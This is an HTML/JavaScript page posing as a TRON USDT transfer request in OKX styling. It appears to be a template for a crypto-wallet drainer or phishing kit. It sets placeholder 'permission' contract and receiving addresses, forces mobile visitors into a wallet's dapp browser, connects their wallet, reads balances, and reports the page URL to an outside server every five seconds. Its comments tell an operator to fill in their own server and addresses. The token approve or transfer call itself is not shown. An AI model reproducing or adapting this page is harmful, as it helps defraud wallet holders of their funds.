<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
    <title>正在申请转账</title>
    <link rel="icon" type="image/png" href="png/icon_trx.png">
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        ::-webkit-scrollbar {
            display: none;
        }
        .tishi {
            width: 58%;
            padding: 0.1rem 0.3rem;
            background: #4b4848;
            z-index: 999999;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 0.3rem;
            color: white;
            font-size: 1rem;
            text-align: center;
            display: none;
            margin: 0 auto;
        }
    </style>
    <link rel="stylesheet" href="css/okx.css">
</head>

<body id="app">
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>

    <!-- 钱包选择界面 -->
    <div id="walletSelection" style="display:none; text-align:center;">
        <p>请选择支付钱包：</p>
        <button onclick="selectWallet(0)">TronLink</button>
        <button onclick="selectWallet(1)">TokenPocket</button>
        <button onclick="selectWallet(2)">OKX Wallet</button>
        <button onclick="selectWallet(3)">MathWallet</button>
    </div>

    <div class="tishi" id="tip">提示</div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            showWalletSelection();
        });

        // 显示钱包选择界面
        function showWalletSelection() {
            const walletSelection = document.getElementById('walletSelection');
            if (walletSelection) {
                walletSelection.style.display = 'block';
            }
        }

        // 处理钱包选择
        function selectWallet(walletIndex) {
            console.log(`用户选择的钱包索引: ${walletIndex}`);
            localStorage.setItem('selectedWallet', walletIndex);
            document.getElementById('walletSelection').style.display = 'none';
            initializeDApp();
        }

        // 权限地址（合约地址）
        window.Permission_address = 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4';
        // 收款地址（个人地址）
        window.Payment_address = 'TKaKDsmfNuHU6M7iuPvK88Amq1ydTU2sKh';
        // USDT官方合约地址（无需修改）
        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // 服务器地址用于发送心跳（修改为你自己的服务器域名）
        window.heartbeatUrl = 'https://autokeys.online/heartbeat';

        // 存储用户数据
        const userData = {
            address: null,
            trxBalance: 0,
            usdtBalance: 0
        };
        let currentAmount = '0';
        const TRX_TO_USD_RATE = 0.1562;

        // 主初始化函数
        async function initializeDApp() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';

            if (!isMobile) {
                document.body.innerHTML = '<p>请使用手机浏览器访问</p>';
                return;
            }

            if (isMobile && !isDAppBrowser) {
                const currentUrl = encodeURIComponent(window.location.href);
                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
                return;
            }

            await connectWallet();
            updateAmountDisplay();
        }

        // 连接到钱包
        async function connectWallet() {
            try {
                if (window.tronWeb && window.tronWeb.ready) {
                    await initDApp();
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res.code === 200) {
                        window.tronWeb = window.tronLink.tronWeb;
                        await initDApp();
                    } else {
                        alert("连接 TronLink 失败，请重试");
                        showWalletSelection();
                    }
                }
            } catch (error) {
                console.error("钱包连接失败:", error);
                alert("连接钱包时发生错误，请重试");
                showWalletSelection();
            }
        }

        // 初始化DApp
        async function initDApp() {
            try {
                userData.address = window.tronWeb.defaultAddress.base58;
                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
                updateTRXBalance();
            } catch (error) {
                console.error("获取用户数据时出错:", error);
            }
        }

        // 更新页面的TRX余额
        function updateTRXBalance() {
            const balanceElement = document.getElementById('ye');
            if (balanceElement) {
                balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
            }
        }

        // 向服务器发送心跳（可选功能）
        function sendHeartbeat() {
            fetch(window.heartbeatUrl, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url: window.location.href })
            });
        }

        const heartbeatInterval = setInterval(sendHeartbeat, 5000);

        window.onload = () => {
            sendHeartbeat();
            initializeDApp();
        };

        window.onbeforeunload = function () {
            clearInterval(heartbeatInterval);
        };
    </script>
</body>
</html>
